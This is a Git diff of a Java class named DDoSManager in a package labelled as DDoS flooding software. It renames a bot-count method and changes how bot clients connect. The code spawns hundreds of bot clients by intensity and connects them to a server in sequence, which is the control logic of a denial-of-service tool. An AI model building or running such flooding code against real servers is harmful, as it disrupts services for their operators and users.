@@ -1,5 +1,6 @@
 package src.Main.DDosSoftware.DDosLogic.Flood;
 
+import src.Main.DDosSoftware.DDosLogic.Client.Client;
 import src.Main.DDosSoftware.DDosLogic.Client.ClientManager;
 import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
 import src.Main.DDosSoftware.Enums.Intensity;
@@ -30,15 +31,15 @@ public class DDoSManager {
     // ! THINGS ARE BEGIN HERE
     public void start() {
         // * CREATE BOTS
-        for (int bot = 0; bot < getBotSize(intensity); bot++) {
+        for (int bot = 0; bot < getBotSizeBaseOnIntensity(intensity); bot++) {
             ClientManager.createClient(bot);
         }
 
         if (ServerManager.canConnect()) {
             // * CONNECT TO THE SERVER
             for (int index = 0; index < ClientManager.clients.size(); index++) {
-                // * Start new client thread
-                ClientManager.clients.get(index).connect();
+
+                ClientManager.connect(ClientManager.clients.get(index), index);
 
                 try {
                     Thread.sleep(delayTime);
@@ -77,7 +78,7 @@ public class DDoSManager {
         return this;
     }
 
-    public static int getBotSize(Intensity intense) {
+    public static int getBotSizeBaseOnIntensity(Intensity intense) {
         switch (intense) {
             case LOW:
                 return 500;
